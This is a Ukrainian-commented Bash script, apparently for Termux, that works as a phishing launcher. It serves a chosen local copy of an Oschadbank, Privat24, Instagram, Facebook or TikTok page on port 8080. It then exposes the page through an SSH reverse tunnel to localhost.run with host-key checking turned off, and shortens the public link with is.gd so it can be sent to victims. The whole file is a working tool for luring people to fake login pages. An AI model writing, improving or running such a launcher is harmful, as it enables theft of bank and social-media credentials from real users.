#!/bin/bash

# Очищення екрана та гарний заголовок
clear
echo -e "\e[92m"
echo "  ==========================================="
echo "  * MALOY AUTO-SHORT PANEL v2.0       *"
echo "  ==========================================="
echo -e "\e[0m"

# Меню вибору
echo "1) Oschadbank   2) Privat24   3) Instagram"
echo "4) Facebook     5) TikTok"
echo "-------------------------------------------"
read -p "Вибери номер сайту: " choice

# Визначення файлу
case $choice in
    1) file="oschad.html" ; name="OSCHAD" ;;
    2) file="privat.html" ; name="PRIVAT" ;;
    3) file="inst.html"   ; name="INSTA" ;;
    4) file="fb.html"     ; name="FB" ;;
    5) file="tt.html"     ; name="TIKTOK" ;;
    *) echo -e "\e[91mПомилка: Вибери від 1 до 5!\e[0m"; exit 1 ;;
esac

# Перевірка чи є такий файл, щоб не було помилок
if [ ! -f "$file" ]; then
    echo -e "\e[91mПомилка: Файл $file не знайдено в папці!\e[0m"
    exit 1
fi

# Підготовка індексу
cp $file index.html

# Вбиваємо старі сервери, щоб порт 8080 був вільний
pkill -f "python -m http.server" > /dev/null 2>&1
rm -f tunnel.log

# Запуск локального сервера у фоні
python -m http.server 8080 > /dev/null 2>&1 &

echo -e "\n\e[93m[+] Сервер $name запущено на порті 8080...\e[0m"
echo -e "\e[93m[+] Створюю тунель та скорочую посилання (зачекай 5 сек)...\e[0m"

# Запуск тунелю SSH у фоні з записом логів
ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run > tunnel.log 2>&1 &

# Даємо 6 секунд, щоб SSH встиг отримати посилання від сервера
sleep 6

# Витягуємо довге посилання з лог-файлу
LONG_URL=$(grep -o 'https://[^ ]*lhr.life' tunnel.log | head -n 1)

if [ -z "$LONG_URL" ]; then
    echo -e "\e[91m[-] Помилка: Не вдалося отримати посилання від тунелю.\e[0m"
    echo "Спробуй перезапустити інтернет або скрипт."
    pkill -f "python -m http.server"
    exit 1
else
    echo -e "\e[92m[+] Пряме посилання: $LONG_URL\e[0m"
    
    # СКОРОЧЕННЯ ЧЕРЕЗ API is.gd
    SHORT_URL=$(curl -s "https://is.gd/create.php?format=simple&url=$LONG_URL")
    
    echo -e "\e[94m-------------------------------------------\e[0m"
    echo -e "\e[96m[★] ТВОЄ КОРОТКЕ ПОСИЛАННЯ: \e[1m$SHORT_URL\e[0m"
    echo -e "\e[94m-------------------------------------------\e[0m"
    echo -e "\e[90m(Не закривай Termux, поки працюєш!)\e[0m"
fi

# Тримаємо скрипт живим, щоб тунель не впав
wait

